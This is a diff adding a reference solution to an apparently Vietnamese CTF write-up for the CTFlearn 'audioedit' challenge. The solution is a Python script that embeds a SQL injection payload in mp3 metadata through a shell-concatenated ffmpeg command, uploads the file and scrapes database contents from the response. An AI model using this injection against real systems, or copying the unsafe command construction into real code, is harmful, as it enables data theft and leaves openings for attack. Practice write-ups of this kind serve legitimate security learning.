@@ -587,3 +587,35 @@ cái mà mình upload lên sẽ có tên là file, thử vào ta được `super
     - ** Tại sao lại lần file: Thì đơn giản là file mp3 mà nó có phần Visualisation thì khả năng là sẽ thấy flag qua đó chứ không ngta để đó làm gì :)).
     - Tới đây chỉ cần thêm phần flag vào file là ra `https://web.ctflearn.com/audioedit/edit.php?file=ec8557875edb4b19639d77a06ceb0eedf3c60dee.mp3`
     - Nhưng mà do bài này đã được tải lên từ rất rất lâu rồi nên có nhiều thay đổi trong công nghệ làm file bị lỗi nên ta sẽ không thể xem dduocj wflag nhưng ta có thể tải file về để check bằng lệnh `wget https://web.ctflearn.com/audioedit/uploads/supersecretflagf1le.mp3` và kiểm tra spectrum ở một trang web nào đó rồi điền flag thôi.
+- Đoạn mã tham khảo:
+    ```
+    import requests, os, string, random
+
+    sql="',(select file from audioedit as hehe limit 1)) --   "
+
+    ra = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+
+    # Nếu bạn cần thêm metadata (SQL injection giả lập), có thể thử
+    os.system("ffmpeg -i in.mp3 -metadata artist=\"" + sql + "\" -metadata title=\"" + ra + "\" out.mp3")
+    with open('out.mp3', 'rb') as audio_file:
+        r = requests.post(
+            "https://web.ctflearn.com/audioedit/submit_upload.php",
+            files={'audio': audio_file},
+            allow_redirects=False
+        )
+
+    # Xóa tệp output sau khi sử dụng
+    os.remove("out.mp3")
+
+    # Kiểm tra xem header có chứa 'location' hay không
+    location = r.headers.get('location')
+    if location:
+        r = requests.get('https://web.ctflearn.com/audioedit' + location[1:])
+        t = r.text.split('<h5>Title: <small>')
+        t = t[1].split('</small>')
+        k = t[0]
+        print(k)
+    else:
+        print("No redirect found")
+
+    ```
